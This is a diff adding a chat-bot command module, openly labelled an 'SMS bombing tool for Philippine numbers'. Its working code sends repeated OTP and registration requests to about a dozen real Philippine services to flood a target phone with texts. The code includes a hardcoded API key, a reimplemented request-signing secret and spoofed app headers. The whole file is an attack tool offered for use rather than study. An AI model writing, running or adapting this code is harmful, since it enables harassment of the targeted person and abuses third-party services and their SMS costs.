@@ -1,0 +1,436 @@
+const axios = require('axios');
+const crypto = require('crypto');
+
+module.exports.config = {
+  name: "smsbomb",
+  version: "4.0.0",
+  role: 2,
+  credits: "selov",
+  description: "SMS bombing tool for Philippine numbers",
+  commandCategory: "utility",
+  usages: "/sms <phone> <amount>",
+  cooldowns: 60
+};
+
+module.exports.run = async function ({ api, event, args }) {
+  const { threadID, messageID, senderID } = event;
+
+  // Helper functions
+  const formatPhone = (phone) => {
+    phone = phone.toString().trim().replace(/[\s\-+]/g, '');
+    if (phone.startsWith('0')) phone = phone.slice(1);
+    if (phone.startsWith('63')) phone = phone.slice(2);
+    return phone;
+  };
+
+  const validatePhone = (phone) => {
+    const cleanPhone = formatPhone(phone);
+    return /^9\d{9}$/.test(cleanPhone);
+  };
+
+  const randomString = (length) => {
+    return crypto.randomBytes(Math.ceil(length/2))
+      .toString('hex')
+      .slice(0, length);
+  };
+
+  const generateKumuSignature = (timestamp, randomStr, phoneNumber) => {
+    const secret = "kumu_secret_2024";
+    const data = `${timestamp}${randomStr}${phoneNumber}${secret}`;
+    return crypto.createHash('sha256').update(data).digest('hex');
+  };
+
+  // Service functions
+  const services = [
+    {
+      name: "MWELL ULTRA",
+      func: async (phone) => {
+        try {
+          const API_URL = "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number";
+          const API_KEY = "0a57846786b34b0a89328c39f584892b";
+          
+          const formattedPhone = formatPhone(phone);
+          const headers = {
+            'User-Agent': 'okhttp/4.11.0',
+            'Content-Type': 'application/json',
+            'ocp-apim-subscription-key': API_KEY,
+            'x-app-version': '03.942.035',
+            'x-device-type': 'android',
+            'x-device-model': 'oneplus CPH2465'
+          };
+          const data = {
+            "country": "PH",
+            "phoneNumber": formattedPhone,
+            "phoneNumberPrefix": "+63"
+          };
+          const response = await axios.post(API_URL, data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "EZLOAN",
+      func: async (phone) => {
+        try {
+          const formattedPhone = formatPhone(phone);
+          const currentTime = Date.now();
+          const headers = {
+            'User-Agent': 'okhttp/4.9.2',
+            'Content-Type': 'application/json',
+            'blackbox': `kGPGg${currentTime}DCl3O8MVBR0`
+          };
+          const data = {
+            "businessId": "EZLOAN",
+            "contactNumber": `+63${formattedPhone}`,
+            "appsflyerIdentifier": `${currentTime}`
+          };
+          const response = await axios.post('https://gateway.ezloancash.ph/security/auth/otp/request', data, { headers, timeout: 8000 });
+          return response.status === 200 && response.data?.code === 0;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "XPRESS PH",
+      func: async (phone, index) => {
+        try {
+          const headers = {
+            'User-Agent': 'Dalvik/2.1.0',
+            'Content-Type': 'application/json'
+          };
+          const timestamp = Math.floor(Date.now() / 1000);
+          const data = {
+            "FirstName": `U${timestamp}`,
+            "LastName": "T",
+            "Email": `u${timestamp}@gm.com`,
+            "Phone": `+63${formatPhone(phone)}`,
+            "Password": "Pass123!",
+            "ConfirmPassword": "Pass123!"
+          };
+          const response = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "ABENSON",
+      func: async (phone) => {
+        try {
+          const headers = {
+            'User-Agent': 'okhttp/4.9.0',
+            'Content-Type': 'application/x-www-form-urlencoded'
+          };
+          const data = `contact_no=${phone}&login_token=undefined`;
+          const response = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "EXCELLENT LENDING",
+      func: async (phone) => {
+        try {
+          const headers = {
+            'User-Agent': 'okhttp/4.12.0',
+            'Content-Type': 'application/json'
+          };
+          const data = {
+            "domain": phone,
+            "cat": "login",
+            "previous": false,
+            "financial": randomString(32)
+          };
+          const response = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "BISTRO",
+      func: async (phone) => {
+        try {
+          const formattedPhone = formatPhone(phone);
+          const headers = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 16)',
+            'x-requested-with': 'com.allcardtech.bistro'
+          };
+          const url = `https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${formattedPhone}`;
+          const response = await axios.get(url, { headers, timeout: 8000 });
+          return response.status === 200 && response.data?.isSuccessful;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "WEMOVE",
+      func: async (phone) => {
+        try {
+          const headers = {
+            'User-Agent': 'okhttp/4.9.3',
+            'Content-Type': 'application/json'
+          };
+          const data = {
+            "phone_country": '+63',
+            "phone_no": formatPhone(phone)
+          };
+          const response = await axios.post('https://api.wemove.com.ph/auth/users', data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "LBC CONNECT",
+      func: async (phone) => {
+        try {
+          const headers = {
+            'User-Agent': 'Dart/2.19',
+            'Content-Type': 'application/x-www-form-urlencoded'
+          };
+          const data = {
+            'verification_type': 'mobile',
+            'client_contact_no': formatPhone(phone)
+          };
+          const response = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "PICKUP COFFEE",
+      func: async (phone) => {
+        try {
+          const headers = {
+            'User-Agent': 'okhttp/4.12.0',
+            'Content-Type': 'application/json'
+          };
+          const data = {
+            "mobile_number": `+63${formatPhone(phone)}`,
+            "login_method": 'mobile_number'
+          };
+          const response = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', data, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "HONEY LOAN",
+      func: async (phone) => {
+        try {
+          const headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'Content-Type': 'application/json'
+          };
+          const data = {
+            "phone": phone,
+            "is_rights_block_accepted": 1
+          };
+          const response = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', data, { headers, timeout: 8000 });
+          return response.status === 200 && response.data?.success;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "KUMU PH",
+      func: async (phone) => {
+        try {
+          const formattedPhone = formatPhone(phone);
+          const ts = Math.floor(Date.now() / 1000);
+          const sig = generateKumuSignature(ts, randomString(32), formattedPhone);
+          const headers = { 'Content-Type': 'application/json' };
+          const data = {
+            "country_code": "+63",
+            "cellphone": formattedPhone,
+            "encrypt_signature": sig,
+            "encrypt_timestamp": ts
+          };
+          const response = await axios.post('https://api.kumuapi.com/v2/user/sendverifysms', data, { headers, timeout: 8000 });
+          return response.status === 200 || response.status === 403;
+        } catch {
+          return false;
+        }
+      }
+    },
+    {
+      name: "S5.COM",
+      func: async (phone) => {
+        try {
+          const normalizedPhone = `+63${formatPhone(phone)}`;
+          const boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+          const headers = {
+            'Content-Type': `multipart/form-data; boundary=${boundary}`
+          };
+          const body = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${normalizedPhone}\r\n--${boundary}--\r\n`;
+          const response = await axios.post('https://api.s5.com/player/api/v1/otp/request', body, { headers, timeout: 8000 });
+          return response.status === 200;
+        } catch {
+          return false;
+        }
+      }
+    }
+  ];
+
+  try {
+    // Parse arguments
+    const phone = args[0];
+    const amount = args[1] ? parseInt(args[1]) : 1;
+
+    // Validate phone
+    if (!phone) {
+      return api.sendMessage(
+        "❌ **Usage:** /sms <phone> <amount>\n" +
+        "📱 **Example:** /sms 9123456789 5\n\n" +
+        "⚠️ Use 10-digit format (e.g., 9123456789)",
+        threadID,
+        messageID
+      );
+    }
+
+    if (!validatePhone(phone)) {
+      return api.sendMessage(
+        "❌ **Invalid phone number!**\n" +
+        "Please provide a valid 10-digit Philippine mobile number.\n" +
+        "📱 **Format:** 9123456789",
+        threadID,
+        messageID
+      );
+    }
+
+    if (isNaN(amount) || amount < 1 || amount > 20) {
+      return api.sendMessage(
+        "❌ Amount must be between 1-20.",
+        threadID,
+        messageID
+      );
+    }
+
+    const formattedPhone = formatPhone(phone);
+    const totalServices = services.length;
+    const totalRequests = amount * totalServices;
+
+    // Send initial message
+    const waiting = await api.sendMessage(
+      `📱 **SMS BOMB STARTED**\n━━━━━━━━━━━━━━━━\n` +
+      `📞 **Target:** +63${formattedPhone}\n` +
+      `📊 **Batches:** ${amount}\n` +
+      `🔄 **Services:** ${totalServices}\n` +
+      `⚡ **Total Requests:** ${totalRequests}\n` +
+      `━━━━━━━━━━━━━━━━\n` +
+      `⏳ Processing... 0/${totalRequests}`,
+      threadID
+    );
+
+    let successCount = 0;
+    let failCount = 0;
+    let processedCount = 0;
+    const results = [];
+
+    // Create progress message
+    const progressMsg = await api.sendMessage(
+      `📊 Progress: 0/${totalRequests} completed`,
+      threadID
+    );
+
+    // Execute all batches
+    for (let batch = 1; batch <= amount; batch++) {
+      // Update batch status
+      await api.editMessage(
+        `📱 **BATCH ${batch}/${amount}**\n━━━━━━━━━━━━━━━━\n` +
+        `⏳ Sending to ${totalServices} services...`,
+        waiting.messageID
+      );
+
+      // Execute all services in parallel for this batch
+      const promises = services.map(async (service) => {
+        try {
+          let result;
+          if (service.name === "XPRESS PH") {
+            result = await service.func(phone, batch);
+          } else {
+            result = await service.func(phone);
+          }
+          
+          if (result) {
+            successCount++;
+            results.push(`✅ ${service.name}`);
+          } else {
+            failCount++;
+            results.push(`❌ ${service.name}`);
+          }
+        } catch {
+          failCount++;
+          results.push(`❌ ${service.name}`);
+        } finally {
+          processedCount++;
+          
+          // Update progress every few requests
+          if (processedCount % 5 === 0 || processedCount === totalRequests) {
+            await api.editMessage(
+              `📊 Progress: ${processedCount}/${totalRequests} completed\n` +
+              `✅ Success: ${successCount}\n` +
+              `❌ Failed: ${failCount}`,
+              progressMsg.messageID
+            );
+          }
+        }
+      });
+
+      await Promise.allSettled(promises);
+
+      // Delay between batches
+      if (batch < amount) {
+        await new Promise(resolve => setTimeout(resolve, 3000));
+      }
+    }
+
+    // Calculate success rate
+    const successRate = ((successCount / totalRequests) * 100).toFixed(1);
+
+    // Prepare result summary
+    const resultSummary = results.slice(-10).join('\n'); // Show last 10 results
+
+    // Final result message
+    const resultMsg = 
+      `📱 **SMS BOMB COMPLETE**\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `📞 **Target:** +63${formattedPhone}\n` +
+      `📊 **Batches:** ${amount}\n` +
+      `🔄 **Services:** ${totalServices}\n` +
+      `⚡ **Total Requests:** ${totalRequests}\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `✅ **Successful:** ${successCount}\n` +
+      `❌ **Failed:** ${failCount}\n` +
+      `📈 **Success Rate:** ${successRate}%\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `**Last 10 Results:**\n${resultSummary}\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `💬 Request completed!`;
+
+    // Delete progress message
+    api.unsendMessage(progressMsg.messageID);
+
+    // Update waiting message with results
+    await api.editMessage(resultMsg, waiting.messageID);
+
+  } catch (err) {
+    console.error("SMS Command Error:", err);
+    api.sendMessage(`❌ Error: ${err.message}`, threadID, messageID);
+  }
+};
